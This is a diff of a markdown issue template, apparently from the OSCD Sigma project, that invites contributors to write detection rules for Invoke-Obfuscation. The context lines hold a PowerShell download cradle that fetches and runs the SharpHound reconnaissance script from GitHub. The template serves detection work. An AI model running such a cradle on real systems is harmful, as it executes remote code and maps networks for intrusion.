@@ -15,7 +15,7 @@ Import-Module ./Invoke-Obfuscation.psd1
 Invoke-Obfuscation
 SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
 ```
-#### Just pick up the obfuscation method(s) and the appropriate Case(s) # you prefer and write a Sigma rule for them. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the number of the case(s) you solved         (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1"*)        (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1,3,7"*)        (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1-15"*)
+#### Just pick up the obfuscation method(s) and the appropriate Case(s) # you prefer and write a Sigma rule for them. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the number of the case(s) you solved <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1,3,7"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1-15"*)
 
 ### TOKEN OBFUSCATION
 | Case # | Option #1 | Option #2 | Option #3 | Result |
